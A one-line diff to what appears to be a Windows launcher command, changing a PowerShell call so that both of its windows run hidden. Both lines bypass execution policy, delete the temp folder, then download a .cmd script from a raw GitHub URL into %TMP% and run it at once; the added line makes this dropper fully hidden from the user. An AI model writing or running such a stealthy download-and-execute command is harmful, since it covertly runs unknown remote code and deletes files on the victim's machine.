@@ -1,1 +1,1 @@
- powershell -W Hidden -Exec Bypass cmd.exe /c rd %temp% /s /q & cls & powershell -W Minimised cmd.exe /c %wget% https://raw.githubusercontent.com/mediatui/tool/master/multi/methodmulti.cmd -O "%TMP%\methodmulti.cmd" && "%TMP%\methodmulti.cmd"
+ powershell -W Hidden -Exec Bypass cmd.exe /c rd %temp% /s /q & cls & powershell -W Hidden cmd.exe /c %wget% https://raw.githubusercontent.com/mediatui/tool/master/multi/methodmulti.cmd -O "%TMP%\methodmulti.cmd" && "%TMP%\methodmulti.cmd"
